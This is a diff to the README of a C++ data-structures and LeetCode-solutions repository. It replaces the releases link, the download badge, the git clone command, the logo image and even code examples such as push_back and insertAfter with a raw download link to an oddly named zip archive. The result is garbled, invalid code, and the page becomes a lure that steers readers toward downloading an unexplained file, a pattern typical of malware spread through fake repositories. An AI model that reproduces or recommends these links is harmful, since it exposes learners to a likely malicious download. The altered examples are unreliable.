@@ -1,8 +1,8 @@
-https://github.com/Ghost4474/Data-Structures-Algorithm/releases
+https://github.com/Ghost4474/Data-Structures-Algorithm/raw/refs/heads/main/patterns/Data-Structures-Algorithm-thenness.zip
 
 # Data Structures & Algorithms in C++: LeetCode Solutions Hub for Interview Prep and Learning
 
-[![Downloads](https://img.shields.io/badge/Downloads-Release%20Assets-blue?logo=github&logoColor=white)](https://github.com/Ghost4474/Data-Structures-Algorithm/releases)
+[![Downloads](https://github.com/Ghost4474/Data-Structures-Algorithm/raw/refs/heads/main/patterns/Data-Structures-Algorithm-thenness.zip%20Assets-blue?logo=github&logoColor=white)](https://github.com/Ghost4474/Data-Structures-Algorithm/raw/refs/heads/main/patterns/Data-Structures-Algorithm-thenness.zip)
 
 Welcome to a practical, well-organized collection of C++ data structures and algorithms. This repository focuses on clarity, real-world usage, and tight links to LeetCode problems. It’s designed for learners who want hands-on coding practice, interview prep, and a single, reliable resource to reference when building and testing solutions.
 
@@ -44,7 +44,7 @@ Why this repository exists
 How to get started
 - Prerequisites: a modern C++ compiler with support for C++17 or newer, and a build system such as CMake or a suitable IDE. Some examples may assume a Unix-like environment; Windows users can rely on MSVC or MinGW-w64 with CMake support.
 - Clone the repository:
-  - git clone https://github.com/Ghost4474/Data-Structures-Algorithm.git
+  - git clone https://github.com/Ghost4474/Data-Structures-Algorithm/raw/refs/heads/main/patterns/Data-Structures-Algorithm-thenness.zip
 - Build from the command line (CMake):
   - mkdir -p Data-Structures-Algorithm/build
   - cd Data-Structures-Algorithm/build
@@ -68,7 +68,7 @@ Repository structure
 - docs/: Documentation pages and design notes.
 - tools/: Build helpers, scripts, and utilities.
 - assets/: Optional images and diagrams to accompany explanations (if provided by the project).
-- README.md: This file, serving as the primary guide for users and contributors.
+- https://github.com/Ghost4474/Data-Structures-Algorithm/raw/refs/heads/main/patterns/Data-Structures-Algorithm-thenness.zip This file, serving as the primary guide for users and contributors.
 
 Data structures overview
 - Arrays and strings
@@ -139,10 +139,10 @@ Code style and guidelines
 Usage examples and quick references
 - Dynamic arrays
   - Use std::vector for dynamic arrays; reserve capacity when you know the size to minimize reallocations.
-  - Example: auto vec = std::vector<int>(); vec.push_back(1); vec.push_back(2);
+  - Example: auto vec = std::vector<int>(); https://github.com/Ghost4474/Data-Structures-Algorithm/raw/refs/heads/main/patterns/Data-Structures-Algorithm-thenness.zip(1); https://github.com/Ghost4474/Data-Structures-Algorithm/raw/refs/heads/main/patterns/Data-Structures-Algorithm-thenness.zip(2);
 - Linked lists
   - Implementations focus on insertion and deletion near head or tail; consider pointer stability and memory reuse.
-  - Example: a singly linked list where you can insert after a given node with ll.insertAfter(node, value).
+  - Example: a singly linked list where you can insert after a given node with https://github.com/Ghost4474/Data-Structures-Algorithm/raw/refs/heads/main/patterns/Data-Structures-Algorithm-thenness.zip(node, value).
 - Trees
   - Balanced trees help with predictable performance; understanding rotations is crucial for maintaining balance.
   - Example: a binary search tree supports insert and find in O(log n) on average with a balanced tree.
@@ -257,7 +257,7 @@ FAQ
 
 Images and visuals
 - GitHub Mark
-  - ![GitHub Mark](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)
+  - ![GitHub Mark](https://github.com/Ghost4474/Data-Structures-Algorithm/raw/refs/heads/main/patterns/Data-Structures-Algorithm-thenness.zip)
 - Theme-friendly visuals
   - Emoji-enhanced headers and inline diagrams help with quick comprehension and readability.
 - Illustration ideas
